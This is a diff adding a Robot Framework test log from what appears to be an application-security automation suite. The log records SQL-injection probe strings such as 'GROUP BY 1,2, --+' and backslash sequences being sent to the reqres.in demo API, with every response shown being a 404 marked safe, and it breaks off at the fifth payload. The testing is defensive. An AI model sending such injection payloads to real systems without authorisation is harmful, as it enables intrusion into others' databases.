@@ -1,0 +1,839 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<robot generator="Robot 4.0.2 (Python 3.9.0 on win32)" generated="20210529 13:33:21.390" rpa="false" schemaversion="2">
+<suite id="s1" name="Mysqldb" source="D:\COE_Automation\Database\Mysqldb.robot">
+<kw name="Connect To Database" library="DatabaseLibrary" type="SETUP">
+<arg>pymysql</arg>
+<arg>${dbname}</arg>
+<arg>${dbuser}</arg>
+<arg>${dbpass}</arg>
+<arg>${dbhost}</arg>
+<arg>${dbport}</arg>
+<doc>Loads the DB API 2.0 module given `dbapiModuleName` then uses it to
+connect to the database using `dbName`, `dbUsername`, and `dbPassword`.</doc>
+<msg timestamp="20210529 13:33:22.523" level="INFO">Connecting using : pymysql.connect(db=robot, user=root, passwd=, host=localhost, port=3306, charset=None) </msg>
+<status status="PASS" starttime="20210529 13:33:22.485" endtime="20210529 13:33:22.586"/>
+</kw>
+<test id="s1-t1" name="TC2">
+<kw name="Log To Console" library="BuiltIn">
+<arg>"Performing SQL Injection Attack on ITS-ITGue"</arg>
+<doc>Logs the given message to the console.</doc>
+<status status="PASS" starttime="20210529 13:33:22.588" endtime="20210529 13:33:22.588"/>
+</kw>
+<kw name="Query" library="DatabaseLibrary">
+<var>@{output}</var>
+<arg>SELECT * FROM exceldetails LIMIT 1;</arg>
+<doc>Uses the input `selectStatement` to query for the values that will be returned as a list of tuples. Set optional
+input `sansTran` to True to run command without an explicit transaction commit or rollback.
+Set optional input `returnAsDict` to True to return values as a list of dictionaries.</doc>
+<msg timestamp="20210529 13:33:22.590" level="INFO">Executing : Query  |  SELECT * FROM exceldetails LIMIT 1; </msg>
+<msg timestamp="20210529 13:33:22.592" level="INFO">@{output} = [ ('D:/Programming/Application Security/coe-application-security/DataFiles/API.xlsx', 'ITSM', 'TestAPI', 'D:/Programming/Application Security/coe-application-security/DataFiles/Payloads.xlsx', 'SQL') ...</msg>
+<status status="PASS" starttime="20210529 13:33:22.589" endtime="20210529 13:33:22.592"/>
+</kw>
+<kw name="Log" library="BuiltIn">
+<arg>@{output}</arg>
+<doc>Logs the given message with the given level.</doc>
+<msg timestamp="20210529 13:33:22.594" level="INFO">('D:/Programming/Application Security/coe-application-security/DataFiles/API.xlsx', 'ITSM', 'TestAPI', 'D:/Programming/Application Security/coe-application-security/DataFiles/Payloads.xlsx', 'SQL')</msg>
+<status status="PASS" starttime="20210529 13:33:22.593" endtime="20210529 13:33:22.594"/>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<var>${Excel_Location}</var>
+<arg>${output[0][0]}</arg>
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<msg timestamp="20210529 13:33:22.597" level="INFO">${Excel_Location} = D:/Programming/Application Security/coe-application-security/DataFiles/API.xlsx</msg>
+<status status="PASS" starttime="20210529 13:33:22.595" endtime="20210529 13:33:22.597"/>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<var>${API_Excel_Sheet_Name}</var>
+<arg>${output[0][1]}</arg>
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<msg timestamp="20210529 13:33:22.601" level="INFO">${API_Excel_Sheet_Name} = ITSM</msg>
+<status status="PASS" starttime="20210529 13:33:22.598" endtime="20210529 13:33:22.601"/>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<var>${API_Module_Name}</var>
+<arg>${output[0][2]}</arg>
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<msg timestamp="20210529 13:33:22.603" level="INFO">${API_Module_Name} = TestAPI</msg>
+<status status="PASS" starttime="20210529 13:33:22.601" endtime="20210529 13:33:22.603"/>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<var>${Payload_Excel_Location}</var>
+<arg>${output[0][3]}</arg>
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<msg timestamp="20210529 13:33:22.606" level="INFO">${Payload_Excel_Location} = D:/Programming/Application Security/coe-application-security/DataFiles/Payloads.xlsx</msg>
+<status status="PASS" starttime="20210529 13:33:22.604" endtime="20210529 13:33:22.606"/>
+</kw>
+<kw name="Set Variable" library="BuiltIn">
+<var>${Payload_Sheet_Name}</var>
+<arg>${output[0][4]}</arg>
+<doc>Returns the given values which can then be assigned to a variables.</doc>
+<msg timestamp="20210529 13:33:22.610" level="INFO">${Payload_Sheet_Name} = SQL</msg>
+<status status="PASS" starttime="20210529 13:33:22.607" endtime="20210529 13:33:22.610"/>
+</kw>
+<kw name="Injection Attack" library="API">
+<arg>${Excel_Location}</arg>
+<arg>${API_Excel_Sheet_Name}</arg>
+<arg>${API_Module_Name}</arg>
+<arg>${Payload_Excel_Location}</arg>
+<arg>${Payload_Sheet_Name}</arg>
+<kw name="Log To Console" library="BuiltIn">
+<arg>"Executing Injection Attack"</arg>
+<doc>Logs the given message to the console.</doc>
+<status status="PASS" starttime="20210529 13:33:22.613" endtime="20210529 13:33:22.615"/>
+</kw>
+<kw name="Log To Console" library="BuiltIn">
+<arg>${Excel_Location}</arg>
+<doc>Logs the given message to the console.</doc>
+<status status="PASS" starttime="20210529 13:33:22.615" endtime="20210529 13:33:22.616"/>
+</kw>
+<kw name="API Wert" library="Injection_Attack">
+<var>${result}</var>
+<arg>${Excel_Location}</arg>
+<arg>${Excel_Sheet_Name}</arg>
+<arg>${Module_Name}</arg>
+<arg>${Payload_Excel_Location}</arg>
+<arg>${Payload_Sheet_Name}</arg>
+<msg timestamp="20210529 13:33:43.343" level="INFO">Outside read excel
+Opening Excel
+Opened Excel
+inside sheet name
+Title of Sheet = ITSM
+Sheetname =ITSM
+Out of sheet nameITSM
+Row 1 = API_Name
+Row 2 = Techview-Console
+Row 3 = ITS-ITGue
+Row 4 = Techview-ITGue
+Row 5 = Techview-References
+Row 6 = Techview-Approval
+Row 7 = Techview-Notifications-CurrentTime
+Row 8 = Techview-Notifications-AllScheduled
+Row 9 = Techview-Servers-and-Desktops
+Row 10 = Techview-Credentials
+Row 11 = Techview-Credentials-Custom
+Row 12 = Techview-Credentials-Desktop
+Row 13 = Techview-Credentials-Servers
+Row 14 = Techview-Recover-Credentials-Recover
+Row 15 = Techview-Recover-Credentials-SBMLogin
+Row 16 = Techview-Recover-Credentials-Passphrase
+Row 17 = Techview-Recover-Credentials-Appliance
+Row 18 = Techview-Recover-GetPassword
+Row 19 = NIF-Antivirus
+Row 20 = NIF-Backup
+Row 21 = NIF-Quickbooks
+Row 22 = NIF-Software
+Row 23 = NIF-On-Premises
+Row 24 = NIF-Email
+Row 25 = NIF-SupportedProtocols
+Row 26 = NIF-SQLServer
+Row 27 = NIF-Database
+Row 28 = NIF-NetworkDrives
+Row 29 = NIF-Resources
+Row 30 = NIF-FileSharing
+Row 31 = NIF-Network
+Row 32 = NIF-Firewall
+Row 33 = NIF-Hosting-And-Registrar
+Row 34 = NIF-ISP-Information
+Row 35 = Local-Area-Network-Information
+Row 36 = NIF-Wireless-Information
+Row 37 = NIF-Printers
+Row 38 = NIF-RemoteAccess
+Row 39 = NIF-WebServer-Intranet
+Row 40 = TestAPI
+Module Found : TestAPI in Row - 40 of Worksheet - ITSM
+Outside row
+API is
+TestAPI
+ROw40
+GET
+GET
+OUtside method
+https
+
+40
+RelativeURL = /api/users/$2$
+
+URL 
+
+https://reqres.in/api/users/$2$
+Fdata Body
+{'': ''}
+{'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Connection': 'keep-alive', 'Referer': 'https://reqres.in/', 'Upgrade-Insecure-Requests': '1'}
+{'': ''}
+{'API': 'TestAPI', 'HTTPMethod': 'GET', 'Protocol': 'https', 'URL': 'https://reqres.in/api/users/$2$', 'Body': {'': ''}, 'Header': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Connection': 'keep-alive', 'Referer': 'https://reqres.in/', 'Upgrade-Insecure-Requests': '1'}, 'Cookie': {'': ''}}
+Data from Excel
+{'API': 'TestAPI', 'HTTPMethod': 'GET', 'Protocol': 'https', 'URL': 'https://reqres.in/api/users/$2$', 'Body': {'': ''}, 'Header': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Connection': 'keep-alive', 'Referer': 'https://reqres.in/', 'Upgrade-Insecure-Requests': '1'}, 'Cookie': {'': ''}}
+https://reqres.in/api/users/2
+['URL']
+No Change in Body
+{'': ''}
+No Change in Header
+{'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Connection': 'keep-alive', 'Referer': 'https://reqres.in/', 'Upgrade-Insecure-Requests': '1'}
+No Change in Cookie
+{'': ''}
+Found GET API, So Executing It.
+Executed GET Method
+{'StatusCode': '200', 'ResponseBody': '{"data":{"id":2,"email":"janet.weaver@reqres.in","first_name":"Janet","last_name":"Weaver","avatar":"https://reqres.in/img/faces/2-image.jpg"},"support":{"url":"https://reqres.in/#support-heading","text":"To keep ReqRes free, contributions towards server costs are appreciated!"}}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:22 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Transfer-Encoding\': \'chunked\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"118-pbdwwFo9SKNhD3Lx5iHJyngpq00"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'1081\', \'cf-request-id\': \'0a58bf41690000d59704979000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=0PC2OCJs5qPT%2FJpoaOjGIK38PGcn4m25vYnUvSNqbg69RHGhkQmi1xWRIMcFjgY8uSQv2sR%2BMsUPdLXysRjov22S8%2FOqkM%2F4p%2B9s%2Fd9s2Z8B6Bz9KFxg"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34af0dc0d597-BOM\', \'Content-Encoding\': \'gzip\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+inside for
+Something up
+Worksheet Found = SQL
+Title of Sheet = SQL
+Number of Payloads for SQL = 21
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 1 = \
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:22 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf422f00000e206d234000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=UOvCezrL1FBVdztmg1HzH8nYYUdmEiKXdxtvYrRGL6I69NThRPNCZoJxb4ZB69WbrA7eEu8g2P6FcCxkwIdluF7D9opZS2xRmShowPVwfTbtVu%2F%2FIuoS"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34b048a30e20-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2\
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:23 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf43ea00002e366a20f000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=hOQDzz7NoSsGLwgCqmFgihsqz%2FWP9wTtrL8w%2BBANv3rr%2B%2BDpfCz3Yp444VmMsPBqVq%2BC5aEy0v7iOVUSOnCJwr9f3bcABL%2Ff6sEsIFNDn7%2FPMZbwhdQz"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34b30fa62e36-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 \
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:23 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf459000000dcc97ad4000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=cEdaTjoI3JFUB%2BNAc2GVB0evIIgdcfljA1291BiaJN8QFxDgFIpxJigZVmH88dqWdXcd4K51phgcwOeo8I3LA4K%2FGy4vNK%2Boz6vCiwDdleVR80FIduBt"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34b5adb10dcc-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 2 = \\\
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:23 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'1\', \'cf-request-id\': \'0a58bf471400002e88aa1a7000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=mFeYQaVr742QLSGXEoSMVFcBvpU3Xyiz7EajPxRQhGefi4QwGNdCAvf1AUYv01LT3VNTXcvcU%2BK77Cl04ZQoXtyv2BWWx%2BwTwYLHSfO1YvmdwPdvRuxB"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34b8284b2e88-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2\\\
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:23 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf478c00000ebdb12af000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=1no32JM7G%2FtleMzrircUDiUwtMbP79Xj%2FOpBQnKzoCTbicd82GFA%2BAm%2F4h0BUZYSnKV3YVBlUdbFJP9QFVILw8ljfwTH02tJYDSxOneP6qP9OrYAVgA%2B"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34b8e8180ebd-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 \\\
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:24 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf4910000031e7b8132000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=bfIy%2FB7ES291BX3shn%2BvT6uwXelEc9g6GYjMZq6N1%2FmyLybvSUXMdogRuv%2B4nwwRqQ2KNLZnXv0GPMRqgjSUAaG%2FtXueTNT5vstP89K3GS3Ysl8v8PPy"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34bb4a1d31e7-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 3 = ||\
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:24 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'2\', \'cf-request-id\': \'0a58bf4a8e00002e3b5f902000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=hHpxs23JY4%2FTJN3MKLAm3BYWRi5TkK6y9WOWZ7WSMtKVBAxHXS58NBarSHA8GQyzhWSe3jxMhzjcIzlL8%2BOO1uDaKCmFIa2DA5gXz%2BPpL3RklkLHlI0U"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34bdacf52e3b-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2||\
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:24 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf4b1d00002e6be902f000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=SmqCUXCMHDoeSf5jWpJNb7rJhjspD8OhLO10QUqkdO2BiUr8EvEv9uzpfX3YSKb4mfpwcJrmyCn9XXqMVVHrSLc%2FSHyx4HLRyI2aOGotLkon98GAfgj9"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34be9d912e6b-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 ||\
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:25 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf4ca500000e2c85378000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=3yMy2aoNSlSOoMSXQS86a3%2FahY9AkHYRHz9zbzS%2FJ60TAa%2FitKsZoHddu7BVtWTlHthnFbdh%2BCGb0506cv9Q8SK7qGDkONfSOiHTxVdPK%2FSDMZXOK8%2Fr"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34c1081f0e2c-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 4 = GROUP BY 1,2, --+
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:25 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'3\', \'cf-request-id\': \'0a58bf4e4a00000eb973363000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=24%2B7YmKqNb0F8OB4L7bVmroRIfhVwd7JGBREApuumihVqUBEfstvSgnpOJMpmTRXvmEXmOXdLARKWPAifmQWhVz7Sdn4KcqbWyuC8iiYiHjqU%2BKxsItu"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34c3accd0eb9-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with UNION***********************************
+https://reqres.in/api/users/2 GROUP BY 1,2, --+
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:25 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'x-powered-by\': \'Express\', \'access-control-allow-origin\': \'*\', \'etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf4ec600000e6091b3d000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=qGvdBveESZJbFQSc2LJ0UEPCJpN3SvkVSXBbwOVzo4i4LdBBoiUEPWhMxzg201AnsUSCCnLNLyAAPITeqeqYR3UxaGLA4qq%2FmH1e6fh2XpfWR%2F5Eimab"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34c46f680e60-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 5 = "1\'1"
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
